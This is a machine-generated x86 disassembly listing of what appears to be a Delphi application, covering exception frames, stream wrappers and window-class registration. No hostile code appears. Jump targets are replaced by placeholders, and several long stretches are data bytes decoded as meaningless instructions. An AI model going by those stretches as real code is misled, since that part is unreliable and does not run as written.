pop edi
pop esi
pop ebx
retn
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
sub_3a83edc
push ebx
push esi
call sub_3a6478c
mov ebx edx
mov esi eax
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_3a64370
test bl bl
jle r-xdata
mov edx esi
call sub_3a84114
pop esi
pop ebx
retn
mov eax esi
call sub_3a64734
sub_3a83f44
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x10 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov [ ebx + 0x10 ] esi
test esi esi
je r-xdata
mov edx ebx
call sub_3a84114
mov edx ebx
mov eax esi
call sub_3a84108
sub_3a83f88
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_3a83664
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov [ esi + 0x50 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_3a646e4
mov eax esi
pop esi
pop ebx
retn
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
sub_3a83fcc
push ebx
push esi
push edi
call sub_3a6478c
mov ebx edx
mov edi eax
mov edx ebx
and dl 0xfc
mov eax edi
call sub_3a836b0
mov eax [ edi + 0x30 ]
test eax eax
je r-xdata
cmp [ edi + 0x50 ] 0x0
je r-xdata
mov edx edi
call sub_3a83978
lea eax [ edi + 0x50 ]
call sub_3a6efbc
test bl bl
jle r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_3a64734
mov esi [ edi + 0x50 ]
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov eax esi
call sub_3a7a57c
mov edx eax
mov eax edi
call sub_3a84114
sub_3a84034
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_3a83994
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x30 ]
jne r-xdata
xor eax eax
mov [ edi + 0x30 ] eax
sub_3a84060
push ebx
cmp [ eax + 0x42 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
mov al 0x1
pop ebx
retn
sub_3a8407c
push ebx
cmp [ eax + 0x4a ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
mov al 0x1
pop ebx
retn
sub_3a84098
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp eax [ ebx + 0x40 ]
jne r-xdata
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0xc ]
cmp eax [ ebx + 0x44 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x40 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0x44 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov edx edi
mov eax [ ebx + 0x50 ]
call sub_3a7a494
mov edx [ eax ]
call [ edx + 0x10 ]
inc edi
dec esi
jne r-xdata
sub_3a84114
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
xor eax eax
mov [ ebp + 0x10 ] eax
mov eax [ edi + 0x50 ]
mov edx ebx
call sub_3a7a388
jmp r-xdata
mov eax [ edi + 0x50 ]
mov edx ebx
call sub_3a7a494
cmp ebp eax
jne r-xdata
sub_3a84154
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x30 ] eax
test eax eax
je r-xdata
mov edx ebx
call sub_3a83978
mov edx ebx
call sub_3a83738
sub_3a84180
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_3a64350
mov [ edi + 0xc ] esi
movzx eax [ ebp + 0x8 ]
mov [ edi + 0x10 ] al
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_3a646e4
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
sub_3a841cc
push ebx
push esi
call sub_3a6478c
mov ebx edx
mov esi eax
cmp [ esi + 0x10 ] 0x1
jne r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_3a64370
test bl bl
jle r-xdata
mov eax [ esi + 0xc ]
call sub_3a64380
xor eax eax
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
mov eax esi
call sub_3a64734
sub_3a84204
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
xor ecx ecx
push ebp
push sub_3a84253
push [ fs : ecx ]
mov [ fs : ecx ] esp
test edx edx
jne r-xdata
mov eax [ eax + 0xc ]
mov ecx [ ebp + 0x10 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov ebx 0x80030009
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp + 0x14 ]
mov [ edx ] eax
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_3a8426c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
xor ecx ecx
push ebp
push sub_3a842bb
push [ fs : ecx ]
mov [ fs : ecx ] esp
test edx edx
jne r-xdata
mov eax [ eax + 0xc ]
mov ecx [ ebp + 0x10 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov ebx 0x80030009
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp + 0x14 ]
mov [ edx ] eax
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_3a842d4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx [ ebp + 0x14 ]
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_3a8433e
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
jl r-xdata
mov ebx 0x80030001
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp ebx 0x2
jle r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x14
mov eax [ esi + 0xc ]
mov ecx ebx
mov edx [ ebp + 0xc ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
cdq
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x18 ]
mov edx [ ebp - 0x8 ]
mov [ eax ] edx
mov edx [ ebp - 0x4 ]
mov [ eax + 0x4 ] edx
sub_3a84358
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_3a843a1
push [ fs : eax ]
mov [ fs : eax ] esp
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
mov eax [ ebx + 0xc ]
call sub_3a7cc20
mov eax [ ebx + 0xc ]
mov edx [ eax ]
call [ edx ]
cmp edx [ ebp + 0x10 ]
jne r-xdata
je r-xdata
cmp eax [ ebp + 0xc ]
xor ebx ebx
mov ebx 0x80004005
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_3a843bc
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov eax [ ebp + 0xc ]
call sub_3a66d28
xor eax eax
push ebp
push sub_3a845af
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x1c ] 0x0
xor eax eax
push ebp
push sub_3a84588
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
jle r-xdata
cmp [ ebp + 0x10 ] 0x100000
jbe r-xdata
mov eax [ ebp + 0x10 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0xc ] 0x100000
jmp r-xdata
jmp r-xdata
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
call sub_3a62ee0
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_3a84577
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
jg r-xdata
cmp [ ebp + 0x10 ] 0x0
ja r-xdata
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_3a62efc
mov eax [ ebp + 0x1c ]
test eax eax
je r-xdata
jmp r-xdata
jle r-xdata
cmp [ ebp + 0x10 ] 0x7fffffff
jbe r-xdata
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x1c ]
mov edx [ ebp - 0x20 ]
mov [ eax ] edx
mov edx [ ebp - 0x1c ]
mov [ eax + 0x4 ] edx
mov esi [ ebp + 0x10 ]
mov esi 0x7fffffff
jmp r-xdata
jmp r-xdata
retn
mov eax [ ebp + 0x18 ]
mov edx [ ebp - 0x18 ]
mov [ eax ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0x4 ] edx
cmp esi [ ebp - 0xc ]
jle r-xdata
test esi esi
jle r-xdata
mov [ ebp - 0x10 ] esi
mov eax [ ebp - 0xc ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax ebx
cdq
add [ ebp - 0x18 ] eax
adc [ ebp - 0x14 ] edx
mov [ ebp - 0x28 ] 0x0
mov [ ebp - 0x24 ] 0x0
lea eax [ ebp - 0x28 ]
push eax
push ebx
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ eax ]
call [ eax + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x28 ]
mov edx [ ebp - 0x24 ]
add [ ebp - 0x20 ] eax
adc [ ebp - 0x1c ] edx
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
call sub_3a64ce0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov ecx [ ebp - 0x10 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx eax
test ebx ebx
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x28 ]
cmp ebx eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a845b6
lea eax [ ebp + 0xc ]
call sub_3a66cb4
retn
sub esi ebx
mov eax ebx
cdq
sub [ ebp + 0x10 ] eax
sbb [ ebp + 0x14 ] edx
test esi esi
jg r-xdata
call sub_3a64ce0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov [ ebp - 0x4 ] 0x80004005
sub_3a845f4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
xor esi esi
xor eax eax
push ebp
push sub_3a84657
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov [ ebx + 0x4 ] 0x2
mov eax [ edi + 0xc ]
mov edx [ eax ]
call [ edx ]
mov [ ebx + 0x8 ] eax
mov [ ebx + 0xc ] edx
xor eax eax
mov [ ebx + 0x10 ] eax
xor eax eax
mov [ ebx + 0x14 ] eax
xor eax eax
mov [ ebx + 0x18 ] eax
xor eax eax
mov [ ebx + 0x1c ] eax
xor eax eax
mov [ ebx + 0x20 ] eax
xor eax eax
mov [ ebx + 0x24 ] eax
mov [ ebx + 0x2c ] 0x1
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_3a84688
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ rw-data ]
call sub_3a7a898
mov edi eax
xor eax eax
push ebp
push sub_3a846dd
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a846e4
mov eax [ rw-data ]
call sub_3a7a8fc
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_3a7a494
call sub_3a64380
inc esi
dec ebx
jne r-xdata
sub_3a846fc
push ebp
mov ebp esp
xor eax eax
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
mov edx esp
mov eax [ ecx + 0x4 ]
call [ ecx ]
add esp 0xc
pop eax
pop ebp
retn 0x10
sub_3a84724
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi rw-data
cmp [ edi ] 0x0
jne r-xdata
mov eax [ edi ]
mov ebx [ edi ]
mov edx [ ebx + 0x5 ]
mov [ edi ] edx
mov edx [ ebp + 0x8 ]
mov [ ebx + 0x5 ] edx
mov edx [ ebp + 0xc ]
mov [ ebx + 0x9 ] edx
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
push 0x40
push 0x1000
push 0x1000
push 0x0
call VirtualAlloc
mov esi eax
mov eax [ rw-data ]
mov [ esi ] eax
lea edx [ esi + 0x4 ]
mov eax rw-data
mov ecx 0x2
call sub_3a63154
mov edx sub_3a846fc
lea eax [ esi + 0x5 ]
call sub_3a8471c
mov [ esi + 0x6 ] eax
lea ebx [ esi + 0xa ]
mov [ ebx ] 0xe8
lea edx [ esi + 0x4 ]
mov eax ebx
call sub_3a8471c
mov [ ebx + 0x1 ] eax
mov eax [ edi ]
mov [ ebx + 0x5 ] eax
mov [ edi ] ebx
add ebx 0xd
mov eax ebx
sub eax esi
cmp eax 0xffc
jl r-xdata
mov [ rw-data ] esi
sub_3a847e0
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
mov eax [ rw-data ]
mov [ rw-data ] eax
lea eax [ ebp - 0x28 ]
push eax
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
push eax
call GetClassInfoA
cmp eax 0x1
sbb eax eax
inc eax
test al al
je r-xdata
test al al
je r-xdata
mov edx DefWindowProcA
cmp edx [ ebp - 0x24 ]
je r-xdata
push rw-data
call RegisterClassA
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
push eax
call UnregisterClassA
push 0x80000000
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ rw-data ]
push eax
push 0x0
mov ecx r-xdata
mov edx [ rw-data ]
mov eax 0x80
call sub_3a67f50
mov ebx eax
cmp [ ebp + 0xa ] 0x0
je r-xdata
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_3a84724
push eax
push 0xfffffffc
push ebx
call SetWindowLongA
sub_3a84894
push ebx
push esi
mov esi eax
push 0xfffffffc
push esi
call GetWindowLongA
mov ebx eax
push esi
call DestroyWindow
cmp ebx DefWindowProcA
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_3a847bc
sub_3a848bc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_3a84960
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a84967
retn
mov eax [ rw-data ]
call sub_3a79a78
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
call sub_3a84688
xor edx edx
xor eax eax
call sub_3a7dcac
mov eax rw-data
call sub_3a6efbc
call sub_3a672cc
lea eax [ eax + 0xc ]
call sub_3a6efbc
mov eax rw-data
call sub_3a6efbc
mov eax rw-data
call sub_3a66cb4
mov eax sub_3a846f4
call sub_3a66b4c
mov eax rw-data
call sub_3a6efbc
call sub_3a82df0
mov eax rw-data
call sub_3a6efbc
mov eax rw-data
call sub_3a66cb4
sub_3a8496c
mov eax 0x3a849
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al cl
dec ecx
test al 0x3
adc al 0x0
add [ eax ] al
cmp [ ebx - 0x59 ] 0x3
enter 0xa645 0x3
aam 0x45
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add ebx [ ebx ]
cmpsd [ esi ] [ edi ]
add edi [ esp + 0x4b8403a7 ]
test al 0x3
jo r-xdata
jmp r-xdata
cmpsd [ esi ] [ edi ]
add ebp eax
mov [ 0x540b03a7 ] eax
dec edi
bound ebp [ edx + 0x65 ]
arpl [ esp + ecx * 2 + 0x69 ] si
retn
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cwde
dec edx
test al 0x3
or [ eax ] al
add [ eax ] al
rcl [ eax ] 0xa6
add ecx eax
inc ebp
cmpsb [ esi ] [ edi ]
and [ edx - 0x58 ] cl
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dh
dec edx
test al 0x3
sbb [ eax ] al
add [ eax ] al
insb
dec ecx
test al 0x3
enter 0xa645 0x3
aam 0x45
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add esi [ eax - 0x43fc57b4 ]
movsb [ edi ] [ esi ]
cmpsd [ esi ] [ edi ]
add ebx [ eax ]
dec ebp
test al 0x3
jo r-xdata
push esp
push ebx
je r-xdata
jb r-xdata
jae r-xdata
arpl [ gs : esp + ecx * 2 + 0x69 ] si
cmpsd [ esi ] [ edi ]
add ebp eax
mov [ 0x540e03a7 ] eax
inc ebx
outsd
insd
jo r-xdata
mov eax eax
arpl [ ebx - 0x70 ] bp
dec esp
imul esi [ ebx + 0x74 ] 0xf400408d
dec edx
test al 0x3
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx - 0x58 ] cl
add ecx [ eax ]
add [ eax ] al
add [ eax + 0x4a ] al
test al 0x3
enter 0xa645 0x3
aam 0x45
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add esp esp
dec ebp
test al 0x3
dec eax
dec esi
test al 0x3
sub [ esi - 0x58 ] cl
add edx [ esi + ecx * 2 ]
test al 0x3
push es
inc eax
add ah dh
outsb
outsb
je r-xdata
test al 0x3
dec eax
xor al 0xa6
add ebp [ eax ]
dec esi
test al 0x3
adc al 0x4e
test al 0x3
or al 0x54
dec edi
jb r-xdata
in al 0x4d
add edx esp
inc ebp
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add esp esp
dec ebp
imul esi [ ebx + 0x74 ] 0xa84a8c90
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x803a84a ] bl
add [ eax ] al
add al al
adc [ esi - 0x59ba37fd ] ah
sub_3a84b10
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov ebx ecx
mov [ ebp - 0x1 ] dl
mov esi eax
xor edx edx
mov eax esi
call sub_3a64350
mov [ esi + 0x10 ] bl
mov eax esi
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_3a646e4
mov eax esi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
sub_3a84b84
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
cmp [ esi + 0x10 ] 0x0
je r-xdata
mov ecx ebx
mov edx edi
mov eax esi
call sub_3a7a73c
pop edi
pop esi
pop ebx
retn
cmp bl 0x2
jne r-xdata
mov eax edi
call sub_3a64380
sub_3a84cb0
push ebx
push esi
call sub_3a6478c
mov ebx edx
mov esi eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_3a7a31c
mov eax [ esi + 0x14 ]
call sub_3a64380
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_3a64734
sub_3a84d18
push ebx
push esi
push edi
push ebp
mov ebx ecx
mov esi edx
mov edi eax
cmp [ edi + 0x14 ] 0x0
jne r-xdata
mov eax ebx
sub al 0x1
jb r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a83664
mov ebp eax
mov [ edi + 0x14 ] ebp
mov [ ebp + 0x34 ] edi
mov [ ebp + 0x30 ] sub_3a84d08
test esi esi
je r-xdata
sub al 0x2
jb r-xdata
mov ecx ebx
mov edx esi
mov eax edi
call sub_3a84b84
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ edi + 0x14 ]
mov eax esi
call sub_3a83738
jmp r-xdata
test esi esi
je r-xdata
jmp r-xdata
mov edx [ edi + 0x14 ]
mov eax esi
call sub_3a83978
sub_3a84da0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_3a64350
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov [ esi + 0x4 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_3a646e4
mov eax esi
pop esi
pop ebx
retn
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
sub_3a84de4
push ebx
push esi
call sub_3a6478c
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_3a64380
mov edx ebx
and dl 0xfc
mov eax esi
call sub_3a64370
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_3a64734
sub_3a84e28
push ebx
push esi
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
mov esi eax
mov eax [ ebx + 0x4 ]
mov edx [ eax + 0x8 ]
dec edx
call sub_3a7a388
mov eax esi
pop esi
pop ebx
retn
sub_3a84e54
pop eax
dec esi
test al 0x3
prefetchw [ ecx + 0x48 ]
insb
dec eax
insb
jo r-xdata
insb
arpl [ gs : edi + ebp * 2 + 0x72 ] si
xor al 0x11
cmpsb [ esi ] [ edi ]
add eax [ ecx ]
pop eax
xchg ebx eax
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns sub_3a84e28
adc ecx [ ecx + 0x45 ]
outsb
je r-xdata
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add esi [ eax + 0x43 ]
cmpsb [ esi ] [ edi ]
add edx [ eax * 2 + 0x706c6548 ]
push ebx
jns r-xdata
outsb
dec eax
adc [ ebx + 0x4fc000b9 ] esp
jae r-xdata
outsd
outsb
je r-xdata
or eax 0xc0830000
fsubr st1
in eax dx
or eax 0x44830000
and al 0x4
fsubr st1
dec ebx
sbb eax 0x4483fffe
and al 0x4
fsubr st1
imul ebx [ 0x4483fffe ] 0xe9d80424
jae r-xdata
je r-xdata
cmpsb [ esi ] [ edi ]
jns r-xdata
imul esp [ ebp + 0x77 ] 0x4ec07265
test al 0x3
add [ esi - 0x6d ] esp
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jb r-xdata
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
add ecx [ edi ]
adc [ ecx + 0x43 ] ecx
jne r-xdata
add bh bh
inc esp
dec esi
test al 0x3
movups [ ecx + 0x43 ] xmm1
lodsd [ esi ]
imul esp [ ebp + 0x77 ] 0x11347265
cmpsb [ esi ] [ edi ]
add eax [ ecx ]
xchg ebx eax
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
jae r-xdata
inc [ ebx - 0x2bfbdbbc ]
jmp sub_3a66d9c
rcr al 0xe9
ror [ eax + eax ] 0x1
add [ ebx - 0x56162740 ] al
insd
inc ebp
js r-xdata
insb
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
adc [ esi - 0x6c9bfefd ] esp
inc ebx
outsb
je r-xdata
add edx esp
inc ebp
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + ecx * 2 + 0xc03a8 ] al
je r-xdata
jns r-xdata
add eax [ eax ]
outsb
je r-xdata
dec [ ebx - 0x57b16f40 ]
add ecx [ edi ]
or ecx [ ecx + 0x48 ]
insb
jo r-xdata
add bh bh
jmp r-xdata
jo r-xdata
lea eax [ eax ]
int3
jae r-xdata
insd
dec eax
insb
jo r-xdata
jo r-xdata
insb
je r-xdata
add [ eax ] al
mov [ esi - 0x59ba37fd ] es
add ecx [ eax + eax ]
jae r-xdata
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0xc ] edx
mov edi eax
xor eax eax
push ebp
push sub_3a85d8b
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
add [ ebx - 0x27fbdbbc ] al
jmp r-xdata
imul ebp [ edi + 0x6e ] 0xcc00408d
add eax 0xffffffdc
jmp r-xdata
dec edi
test al 0x3
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
test [ edi - 0x58 ] cl
add bh bh
inc [ edi + ecx * 2 + 0x3a8 ]
insd
xor al 0x11
cmpsb [ esi ] [ edi ]
add eax [ ecx ]
push ebx
xchg ebx eax
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
js r-xdata
movlps [ ecx + 0x45 ] xmm1
add bh bh
dec [ ebx - 0x57b0ff40 ]
add ecx [ edi ]
mov eax [ edi + 0x14 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
lea eax [ edi + 0x20 ]
mov edx ebx
call sub_3a652f4
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
